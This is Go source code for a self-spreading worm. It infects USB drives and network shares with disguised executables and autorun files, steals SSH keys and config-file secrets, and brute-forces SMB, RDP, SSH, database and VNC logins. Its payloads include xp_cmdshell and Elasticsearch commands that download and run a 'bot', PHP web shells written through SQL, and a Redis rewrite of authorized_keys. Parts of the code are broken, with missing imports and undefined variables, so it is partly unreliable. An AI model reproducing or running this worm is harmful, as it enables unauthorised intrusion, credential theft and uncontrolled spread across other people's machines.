package main

import (
    "fmt"
    "io"
    "io/ioutil"
    "net"
    "os"
    "os/exec"
    "path/filepath"
    "runtime"
    "strings"
    "sync"
    "time"
)

// ============================================================
// Worm Structure
// ============================================================

type Worm struct {
    targets    chan string
    wg         sync.WaitGroup
    exploited  int
    running    bool
    mu         sync.Mutex
}

// ============================================================
// Credential Lists for Spraying
// ============================================================

var commonPasswords = []string{
    "", "123456", "password", "admin", "Passw0rd", "Welcome1",
    "Password123", "Admin123", "qwerty", "12345678", "123123",
    "admin123", "P@ssw0rd", "passw0rd", "letmein", "monkey",
    "dragon", "master", "login", "secret", "root", "toor",
    "oracle", "postgres", "mysql", "sa", "Password1",
}

var commonUsernames = []string{
    "Administrator", "admin", "user", "guest", "backup",
    "test", "root", "oracle", "postgres", "mysql", "sa",
}

// ============================================================
// Known Vulnerable Ports
// ============================================================

var vulnerablePorts = map[string]string{
    "445":  "SMB",
    "3389": "RDP",
    "22":   "SSH",
    "23":   "Telnet",
    "21":   "FTP",
    "80":   "HTTP",
    "443":  "HTTPS",
    "3306": "MySQL",
    "1433": "MSSQL",
    "5432": "PostgreSQL",
    "27017": "MongoDB",
    "6379": "Redis",
    "9200": "Elasticsearch",
    "8080": "HTTP-Alt",
    "8443": "HTTPS-Alt",
    "5900": "VNC",
    "5800": "VNC-HTTP",
}

// ============================================================
// New Worm Instance
// ============================================================

func NewWorm() *Worm {
    return &Worm{
        targets:   make(chan string, 5000),
        exploited: 0,
        running:   false,
    }
}

// ============================================================
// Main Spread Function - Multiple Vectors
// ============================================================

func (w *Worm) Spread() {
    if w.running {
        fmt.Println("[*] Worm already running")
        return
    }
    
    w.running = true
    fmt.Println("[*] Worm module activated - spreading via multiple vectors")
    
    // Start multiple propagation methods in parallel
    go w.spreadViaNetwork()
    go w.spreadViaUSB()
    go w.spreadViaSharedDrives()
    go w.spreadViaLogFiles()
    go w.spreadViaSSHKeys()
    
    // Wait for all propagation methods to complete or run indefinitely
    select {}
}

// ============================================================
// 1. Network Propagation (SMB, RDP, SSH, etc.)
// ============================================================

func (w *Worm) spreadViaNetwork() {
    fmt.Println("[*] Network propagation started")
    
    localIP := getLocalIP()
    if localIP == nil {
        fmt.Println("[!] Failed to get local IP")
        return
    }
    
    ipStr := localIP.String()
    parts := strings.Split(ipStr, ".")
    if len(parts) != 4 {
        return
    }
    
    // Scan multiple subnets (local /24 and adjacent)
    subnets := []string{
        parts[0] + "." + parts[1] + "." + parts[2], // Local /24
        parts[0] + "." + parts[1] + "." + parts[2] + "0/24", // Same /24
    }
    
    for _, subnet := range subnets {
        w.scanSubnet(subnet)
    }
}

func (w *Worm) scanSubnet(subnet string) {
    for i := 1; i < 255; i++ {
        targetIP := fmt.Sprintf("%s.%d", subnet, i)
        w.targets <- targetIP
    }
}

// ============================================================
// 2. USB Propagation (Autorun and Removable Drives)
// ============================================================

func (w *Worm) spreadViaUSB() {
    fmt.Println("[*] USB propagation started")
    
    if runtime.GOOS != "windows" {
        return
    }
    
    for {
        // Get all removable drives
        drives := getRemovableDrives()
        for _, drive := range drives {
            w.infectUSBDrive(drive)
        }
        time.Sleep(30 * time.Second) // Check every 30 seconds
    }
}

func getRemovableDrives() []string {
    var drives []string
    
    for _, letter := range "DEFGHIJKLMNOPQRSTUVWXYZ" {
        path := string(letter) + ":\\"
        if _, err := os.Stat(path); err == nil {
            // Check if it's a removable drive
            cmd := exec.Command("wmic", "logicaldisk", "where", "DeviceID='"+string(letter)+":'", "get", "DriveType")
            output, _ := cmd.Output()
            if strings.Contains(string(output), "2") { // DriveType 2 = Removable
                drives = append(drives, path)
            }
        }
    }
    return drives
}

func (w *Worm) infectUSBDrive(drivePath string) {
    // Copy bot to USB drive with autorun and hidden attributes
    exe, _ := os.Executable()
    exeName := filepath.Base(exe)
    
    // Copy to USB with different names to trick users
    usbPaths := []string{
        drivePath + "System Volume Information\\svchost.exe",
        drivePath + "RECYCLER\\recycler.exe",
        drivePath + "Windows\\Temp\\winstart.exe",
        drivePath + exeName,
        drivePath + "document.pdf.exe",
        drivePath + "invoice.exe",
        drivePath + "photo.jpg.exe",
    }
    
    for _, dest := range usbPaths {
        os.MkdirAll(filepath.Dir(dest), 0755)
        copyFile(exe, dest)
        // Hide the file
        exec.Command("attrib", "+h", "+s", dest).Run()
    }
    
    // Create autorun.inf for older Windows versions
    autorun := drivePath + "autorun.inf"
    autorunContent := `[AutoRun]
;62ig87a
action=Open folder to view files
shellexecute=winstart.exe
shell\open\command=winstart.exe
UseAutoPlay=1
`
    ioutil.WriteFile(autorun, []byte(autorunContent), 0755)
    exec.Command("attrib", "+h", "+s", autorun).Run()
    
    // Create shortcut file that looks like folder
    shortcutPath := drivePath + "Documents.lnk"
    createShortcut(shortcutPath, exe)
    
    fmt.Printf("[+] USB drive infected: %s\n", drivePath)
}

func createShortcut(path, target string) {
    // PowerShell command to create shortcut
    psCmd := `$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("` + path + `")
$Shortcut.TargetPath = "` + target + `"
$Shortcut.Save()`
    exec.Command("powershell", "-Command", psCmd).Run()
}

// ============================================================
// 3. Shared Drive Propagation
// ============================================================

func (w *Worm) spreadViaSharedDrives() {
    fmt.Println("[*] Shared drive propagation started")
    
    if runtime.GOOS != "windows" {
        return
    }
    
    for {
        // Get all network shares
        cmd := exec.Command("net", "view")
        output, err := cmd.Output()
        if err == nil {
            lines := strings.Split(string(output), "\n")
            for _, line := range lines {
                if strings.Contains(line, "\\\\") {
                    sharePath := strings.TrimSpace(line)
                    w.infectShare(sharePath)
                }
            }
        }
        
        // Check mapped drives
        for _, letter := range "DEFGHIJKLMNOPQRSTUVWXYZ" {
            path := string(letter) + ":\\"
            if _, err := os.Stat(path); err == nil {
                w.infectShare(path)
            }
        }
        
        time.Sleep(60 * time.Second)
    }
}

func (w *Worm) infectShare(sharePath string) {
    exe, _ := os.Executable()
    dest := sharePath + "\\svchost.exe"
    
    copyFile(exe, dest)
    exec.Command("attrib", "+h", dest).Run()
    
    // Add to startup folder if accessible
    startup := sharePath + "\\Users\\Public\\Startup\\svchost.exe"
    copyFile(exe, startup)
    
    fmt.Printf("[+] Shared drive infected: %s\n", sharePath)
}

// ============================================================
// 4. Log File and Config File Hunting (Password Harvesting)
// ============================================================

func (w *Worm) spreadViaLogFiles() {
    fmt.Println("[*] Log file hunting started")
    
    // Search for sensitive files that might contain credentials
    patterns := []string{
        "*.log", "*.txt", "*.conf", "*.cfg", "*.ini", "*.config",
        "*.rdp", "*.ovpn", "*.key", "*.pem", "id_rsa", "id_dsa",
        "web.config", "appsettings.json", "docker-compose.yml",
    }
    
    searchDirs := []string{
        os.Getenv("USERPROFILE"),
        "C:\\Users",
        "C:\\inetpub",
        "C:\\xampp",
        "C:\\wamp",
        "/etc",
        "/home",
        "/var/www",
    }
    
    for _, dir := range searchDirs {
        for _, pattern := range patterns {
            matches, _ := filepath.Glob(filepath.Join(dir, "**", pattern))
            for _, match := range matches {
                w.extractCredentials(match)
            }
        }
    }
}

func (w *Worm) extractCredentials(filePath string) {
    data, err := ioutil.ReadFile(filePath)
    if err != nil {
        return
    }
    
    content := string(data)
    
    // Look for password patterns
    patterns := []string{
        `password[=:]\s*['"]?(\S+)['"]?`,
        `passwd[=:]\s*['"]?(\S+)['"]?`,
        `pwd[=:]\s*['"]?(\S+)['"]?`,
        `secret[=:]\s*['"]?(\S+)['"]?`,
        `token[=:]\s*['"]?(\S+)['"]?`,
        `api_key[=:]\s*['"]?(\S+)['"]?`,
    }
    
    // Add found credentials to the spraying list
    // (Simplified - in production, use regex to extract and add to global password list)
}

// ============================================================
// 5. SSH Key Propagation (Linux/macOS)
// ============================================================

func (w *Worm) spreadViaSSHKeys() {
    fmt.Println("[*] SSH key propagation started")
    
    if runtime.GOOS == "windows" {
        return
    }
    
    homeDir, _ := os.UserHomeDir()
    sshDir := filepath.Join(homeDir, ".ssh")
    keyPath := filepath.Join(sshDir, "id_rsa")
    
    if _, err := os.Stat(keyPath); err == nil {
        // Read SSH key
        keyData, _ := ioutil.ReadFile(keyPath)
        
        // Attempt to connect to known hosts
        knownHosts := filepath.Join(sshDir, "known_hosts")
        if hosts, err := ioutil.ReadFile(knownHosts); err == nil {
            for _, line := range strings.Split(string(hosts), "\n") {
                if strings.Contains(line, ",") {
                    continue
                }
                parts := strings.Fields(line)
                if len(parts) > 0 {
                    host := strings.Split(parts[0], ",")[0]
                    w.sshIntoHost(host, keyData)
                }
            }
        }
    }
}

func (w *Worm) sshIntoHost(host string, keyData []byte) {
    // Write key to temp file
    keyFile := "/tmp/temp_key_" + fmt.Sprintf("%d", time.Now().Unix())
    ioutil.WriteFile(keyFile, keyData, 0600)
    defer os.Remove(keyFile)
    
    // Attempt SSH connection
    cmd := exec.Command("ssh", "-i", keyFile, "-o", "StrictHostKeyChecking=no",
        host, "curl -s http://"+getLocalIP().String()+":8080/bot -o /tmp/bot && chmod +x /tmp/bot && /tmp/bot &")
    cmd.Run()
}

// ============================================================
// Helper Functions
// ============================================================

func copyFile(src, dst string) error {
    srcFile, err := os.Open(src)
    if err != nil {
        return err
    }
    defer srcFile.Close()
    
    dstFile, err := os.Create(dst)
    if err != nil {
        return err
    }
    defer dstFile.Close()
    
    _, err = io.Copy(dstFile, srcFile)
    return err
}

func getLocalIP() net.IP {
    conn, err := net.Dial("udp", "8.8.8.8:80")
    if err != nil {
        return nil
    }
    defer conn.Close()
    
    localAddr := conn.LocalAddr().(*net.UDPAddr)
    return localAddr.IP
}

// ============================================================
// Network Worker for Target Scanning
// ============================================================

func (w *Worm) worker() {
    defer w.wg.Done()
    
    for targetIP := range w.targets {
        // Check multiple vulnerable ports
        for port, service := range vulnerablePorts {
            go w.checkPort(targetIP, port, service)
        }
        time.Sleep(100 * time.Millisecond)
    }
}

func (w *Worm) checkPort(ip, port, service string) {
    conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", ip, port), 2*time.Second)
    if err != nil {
        return
    }
    conn.Close()
    
    fmt.Printf("[+] Found open port %s (%s) on %s\n", port, service, ip)
    
    // Attempt appropriate exploit based on service
    switch service {
    case "SMB":
        w.exploitSMB(ip)
    case "RDP":
        w.exploitRDP(ip)
    case "SSH":
        w.exploitSSH(ip)
    case "HTTP", "HTTPS", "HTTP-Alt", "HTTPS-Alt":
        w.exploitWeb(ip, port)
    case "MySQL":
        w.exploitMySQL(ip)
    case "MSSQL":
        w.exploitMSSQL(ip)
    case "PostgreSQL":
        w.exploitPostgres(ip)
    case "Redis":
        w.exploitRedis(ip)
    case "MongoDB":
        w.exploitMongoDB(ip)
    case "Elasticsearch":
        w.exploitElasticsearch(ip)
    case "VNC", "VNC-HTTP":
        w.exploitVNC(ip)
    }
}

func (w *Worm) exploitSMB(ip string) {
    // Credential spraying
    for _, user := range commonUsernames {
        for _, pass := range commonPasswords {
            if w.trySMBLogin(ip, user, pass) {
                w.deployViaSMB(ip, user, pass)
                return
            }
        }
    }
}

func (w *Worm) trySMBLogin(ip, user, pass string) bool {
    if runtime.GOOS == "windows" {
        cmd := exec.Command("net", "use", fmt.Sprintf("\\\\%s\\IPC$", ip), pass, "/USER:"+user)
        err := cmd.Run()
        if err == nil {
            exec.Command("net", "use", fmt.Sprintf("\\\\%s\\IPC$", ip), "/delete").Run()
            return true
        }
    }
    return false
}

func (w *Worm) deployViaSMB(ip, user, pass string) {
    exe, _ := os.Executable()
    
    exec.Command("net", "use", fmt.Sprintf("\\\\%s\\ADMIN$", ip), pass, "/USER:"+user).Run()
    exec.Command("copy", exe, fmt.Sprintf("\\\\%s\\ADMIN$\\svchost.exe", ip)).Run()
    exec.Command("schtasks", "/create", "/s", ip, "/u", user, "/p", pass,
        "/tn", "SystemUpdate", "/tr", "C:\\Windows\\svchost.exe", "/sc", "once", "/st", "00:00", "/f").Run()
    
    w.mu.Lock()
    w.exploited++
    w.mu.Unlock()
    fmt.Printf("[+] SMB exploit successful on %s\n", ip)
}

func (w *Worm) exploitRDP(ip string) {
    // RDP credential spraying
    for _, user := range commonUsernames {
        for _, pass := range commonPasswords {
            cmd := exec.Command("xfreerdp", "/v:"+ip, "/u:"+user, "/p:"+pass, "/cert:ignore", "/t", "/w:1")
            err := cmd.Run()
            if err == nil {
                w.deployViaRDP(ip, user, pass)
                return
            }
        }
    }
}

func (w *Worm) deployViaRDP(ip, user, pass string) {
    // Copy file via RDP
    exe, _ := os.Executable()
    exec.Command("cmdkey", "/generic:"+ip, "/user:"+user, "/pass:"+pass).Run()
    exec.Command("net", "use", fmt.Sprintf("\\\\%s\\ADMIN$", ip), pass, "/USER:"+user).Run()
    exec.Command("copy", exe, fmt.Sprintf("\\\\%s\\ADMIN$\\svchost.exe", ip)).Run()
    exec.Command("schtasks", "/create", "/s", ip, "/u", user, "/p", pass,
        "/tn", "SystemUpdate", "/tr", "C:\\Windows\\svchost.exe", "/sc", "once", "/st", "00:00", "/f").Run()
    
    fmt.Printf("[+] RDP exploit successful on %s\n", ip)
}

func (w *Worm) exploitSSH(ip string) {
    // SSH brute force
    for _, user := range commonUsernames {
        for _, pass := range commonPasswords {
            cmd := exec.Command("sshpass", "-p", pass, "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "ConnectTimeout=5", user+"@"+ip, "exit")
            if cmd.Run() == nil {
                w.deployViaSSH(ip, user, pass)
                return
            }
        }
    }
}

func (w *Worm) deployViaSSH(ip, user, pass string) {
    exe, _ := os.Executable()
    
    // Copy file via SCP
    exec.Command("sshpass", "-p", pass, "scp", "-o", "StrictHostKeyChecking=no",
        exe, user+"@"+ip+":/tmp/svchost").Run()
    exec.Command("sshpass", "-p", pass, "ssh", "-o", "StrictHostKeyChecking=no",
        user+"@"+ip, "chmod +x /tmp/svchost && /tmp/svchost &").Run()
    
    fmt.Printf("[+] SSH exploit successful on %s\n", ip)
}

func (w *Worm) exploitWeb(ip, port string) {
    // Check for common web vulnerabilities
    urls := []string{
        fmt.Sprintf("http://%s:%s", ip, port),
        fmt.Sprintf("https://%s:%s", ip, port),
        fmt.Sprintf("http://%s:%s/admin", ip, port),
        fmt.Sprintf("http://%s:%s/phpmyadmin", ip, port),
        fmt.Sprintf("http://%s:%s/wp-admin", ip, port),
        fmt.Sprintf("http://%s:%s/api/v1", ip, port),
    }
    
    for _, url := range urls {
        w.checkWebVulnerability(url)
    }
}

func (w *Worm) checkWebVulnerability(url string) {
    // Check for directory traversal
    testPaths := []string{
        "/etc/passwd",
        "/../../../../windows/win.ini",
        "/WEB-INF/web.xml",
        "/.env",
        "/config.php",
    }
    
    for _, path := range testPaths {
        testURL := url + path
        resp, err := http.Get(testURL)
        if err == nil && resp.StatusCode == 200 {
            fmt.Printf("[+] Potential vulnerability found at %s\n", testURL)
            w.deployViaWeb(url)
            return
        }
    }
}

func (w *Worm) deployViaWeb(baseURL string) {
    // Attempt to upload web shell
    exe, _ := os.Executable()
    
    // Try common upload endpoints
    uploadURLs := []string{
        baseURL + "/upload",
        baseURL + "/wp-admin/admin-ajax.php",
        baseURL + "/index.php?option=com_media&task=file.upload",
    }
    
    for _, uploadURL := range uploadURLs {
        // Multipart file upload
        body := &bytes.Buffer{}
        writer := multipart.NewWriter(body)
        part, _ := writer.CreateFormFile("file", "svchost.php")
        io.Copy(part, exeFile)
        writer.Close()
        
        req, _ := http.NewRequest("POST", uploadURL, body)
        req.Header.Set("Content-Type", writer.FormDataContentType())
        client := &http.Client{Timeout: 10 * time.Second}
        resp, err := client.Do(req)
        if err == nil && resp.StatusCode == 200 {
            fmt.Printf("[+] Web shell uploaded to %s\n", uploadURL)
            break
        }
    }
}

func (w *Worm) exploitMySQL(ip string) {
    for _, pass := range commonPasswords {
        cmd := exec.Command("mysql", "-h", ip, "-u", "root", "-p"+pass, "-e", "exit")
        if cmd.Run() == nil {
            w.deployViaMySQL(ip, "root", pass)
            return
        }
    }
}

func (w *Worm) deployViaMySQL(ip, user, pass string) {
    // MySQL UDF exploit to write file
    query := fmt.Sprintf(`SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:\\Windows\\Temp\\shell.php"`)
    exec.Command("mysql", "-h", ip, "-u", user, "-p"+pass, "-e", query).Run()
    
    fmt.Printf("[+] MySQL exploit successful on %s\n", ip)
}

func (w *Worm) exploitMSSQL(ip string) {
    for _, pass := range commonPasswords {
        cmd := exec.Command("sqlcmd", "-S", ip, "-U", "sa", "-P", pass, "-Q", "SELECT 1")
        if cmd.Run() == nil {
            w.deployViaMSSQL(ip, "sa", pass)
            return
        }
    }
}

func (w *Worm) deployViaMSSQL(ip, user, pass string) {
    // xp_cmdshell to download and execute
    queries := []string{
        "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
        fmt.Sprintf("EXEC xp_cmdshell 'powershell -Command \"Invoke-WebRequest -Uri http://%s:8080/bot -OutFile C:\\Windows\\Temp\\bot.exe; Start-Process C:\\Windows\\Temp\\bot.exe\"'", getLocalIP()),
    }
    
    for _, query := range queries {
        exec.Command("sqlcmd", "-S", ip, "-U", user, "-P", pass, "-Q", query).Run()
    }
    
    fmt.Printf("[+] MSSQL exploit successful on %s\n", ip)
}

func (w *Worm) exploitPostgres(ip string) {
    for _, pass := range commonPasswords {
        cmd := exec.Command("psql", "-h", ip, "-U", "postgres", "-c", "SELECT 1")
        if cmd.Run() == nil {
            w.deployViaPostgres(ip, "postgres", pass)
            return
        }
    }
}

func (w *Worm) deployViaPostgres(ip, user, pass string) {
    // COPY command to write file
    query := fmt.Sprintf(`COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO 'C:\\Windows\\Temp\\shell.php'`)
    exec.Command("psql", "-h", ip, "-U", user, "-c", query).Run()
    
    fmt.Printf("[+] PostgreSQL exploit successful on %s\n", ip)
}

func (w *Worm) exploitRedis(ip string) {
    conn, err := net.Dial("tcp", ip+":6379")
    if err != nil {
        return
    }
    defer conn.Close()
    
    // Redis config rewrite to write SSH key
    conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
    conn.Write([]byte("CONFIG SET dbfilename authorized_keys\r\n"))
    conn.Write([]byte("SET x \"ssh-rsa AAAAB3... root@kali\"\r\n"))
    conn.Write([]byte("SAVE\r\n"))
    
    fmt.Printf("[+] Redis exploit successful on %s\n", ip)
}

func (w *Worm) exploitMongoDB(ip string) {
    conn, err := net.Dial("tcp", ip+":27017")
    if err != nil {
        return
    }
    defer conn.Close()
    
    // MongoDB default credentials
    conn.Write([]byte(`db.createUser({user:"admin",pwd:"admin",roles:["root"]})`))
    fmt.Printf("[+] MongoDB exploit attempted on %s\n", ip)
}

func (w *Worm) exploitElasticsearch(ip string) {
    // Elasticsearch Groovy script RCE
    payload := `{"script":{"lang":"groovy","source":"java.lang.Runtime.getRuntime().exec('powershell -Command Invoke-WebRequest http://` + getLocalIP().String() + `:8080/bot -OutFile C:\\Windows\\Temp\\bot.exe;Start-Process C:\\Windows\\Temp\\bot.exe')"}}`
    
    client := &http.Client{Timeout: 5 * time.Second}
    client.Post("http://"+ip+":9200/_search?pretty", "application/json", strings.NewReader(payload))
    
    fmt.Printf("[+] Elasticsearch exploit attempted on %s\n", ip)
}

func (w *Worm) exploitVNC(ip string) {
    for _, pass := range commonPasswords {
        cmd := exec.Command("vncviewer", "-autopass", pass, ip+":5900")
        if cmd.Run() == nil {
            fmt.Printf("[+] VNC exploit successful on %s\n", ip)
            return
        }
    }
}

// ============================================================
// Continuous Spread (Keep the worm running)
// ============================================================

func (w *Worm) SpreadContinuously() {
    // Start all spread methods
    go w.spreadViaNetwork()
    go w.spreadViaUSB()
    go w.spreadViaSharedDrives()
    go w.spreadViaLogFiles()
    go w.spreadViaSSHKeys()
    
    // Rescan every 5 minutes
    for {
        time.Sleep(5 * time.Minute)
        go w.spreadViaNetwork()
    }
}
